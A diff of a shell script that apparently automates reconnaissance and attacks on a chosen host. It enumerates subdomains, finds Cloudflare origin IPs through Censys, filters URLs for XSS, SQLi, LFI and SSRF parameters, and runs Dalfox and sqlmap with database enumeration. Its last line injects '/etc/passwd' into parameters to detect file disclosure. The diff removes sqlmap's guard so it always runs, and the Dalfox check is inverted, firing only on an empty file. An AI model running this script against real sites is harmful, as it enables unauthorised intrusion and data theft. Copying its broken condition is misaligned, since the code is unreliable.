@@ -79,7 +79,7 @@ $GOWITNESS file -f live_subdomains_$HOST.txt
 $JSUBFINDER search -f live_subdomains_$HOST.txt -s jsubfinder_secrets_$HOST.txt
 
 # Get URLs with gau
-cat live_subdomains_$HOST.txt | $GAU --mc 200 | $QSREPLACE -a | tee live_urls_$HOST.txt
+cat live_subdomains_$HOST.txt | $GAU --mc 200 | tee live_urls_$HOST.txt
 
 # Run Nuclei on live subdomains
 if [ ! -z "$NUCLEI_TEMPLATES" ]
@@ -97,35 +97,33 @@ cat cloudflare_hosts_$HOST.txt | $QSREPLACE -a | tee cloudflare_hosts_$HOST.txt
 if [ ! -z "$CENSYS_API_ID" ]
 then
     while IFS='' read -r DOMAIN || [ -n "${DOMAIN}" ]; do
-        python3 $CLOUDFLAIR $DOMAIN --censys-api-id $CENSYS_API_ID --censys-api-secret $CENSYS_API_SECRET | tee -a origin_$HOST.txt
+        python3.9 $CLOUDFLAIR $DOMAIN --censys-api-id $CENSYS_API_ID --censys-api-secret $CENSYS_API_SECRET | tee -a origin_$HOST.txt
         sleep 15
     done < cloudflare_hosts_$HOST.txt
 fi
 
 # Extract urls with possible XSS params
-cat live_urls_$HOST.txt | $GF xss > xss_urls_$HOST.txt
+cat live_urls_$HOST.txt | $QSREPLACE -a | $GF xss > xss_urls_$HOST.txt
 
 # Extract urls with possible SQLi params
-cat live_urls_$HOST.txt | $GF sqli > sqli_urls_$HOST.txt
+cat live_urls_$HOST.txt | $QSREPLACE -a | $GF sqli > sqli_urls_$HOST.txt
 
 # Extract urls with possible LFI params
-cat live_urls_$HOST.txt | $GF lfi > lfi_urls_$HOST.txt
+cat live_urls_$HOST.txt | $QSREPLACE -a | $GF lfi > lfi_urls_$HOST.txt
 
 # Extract urls with possible SSRF params
-cat live_urls_$HOST.txt | $GF ssrf > ssrf_urls_$HOST.txt
+cat live_urls_$HOST.txt | $QSREPLACE -a | $GF ssrf > ssrf_urls_$HOST.txt
 
 # Run Dalfox on XSS urls
 if [ ! -s xss_urls_$HOST.txt ]
 then
-    echo "\nRunning DALFOX..\n"
+    echo "Running DALFOX.."
     $DALFOX file xss_urls_$HOST.txt -w 10 -S -o dalfox_XSS_$HOST.txt
 fi
 
 # Run SQLMAP on SQLi urls
-if [ ! -s sqli_urls_$HOST.txt ]
-then
-    $SQLMAP -m sqli_urls_$HOST.txt --batch --random-agent --dbs -o sqlmap_$HOST
-fi
+$SQLMAP -m sqli_urls_$HOST.txt --batch --random-agent --dbs -o sqlmap_$HOST
+
 
 # Test basic LFI vulnerability
 cat lfi_urls_$HOST.txt | $QSREPLACE "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -sk "%" 2>&1 | grep -q "root:x" && echo "VULNERABLE! %"' | tee lfi_vulnerable_urls_$HOST.txt
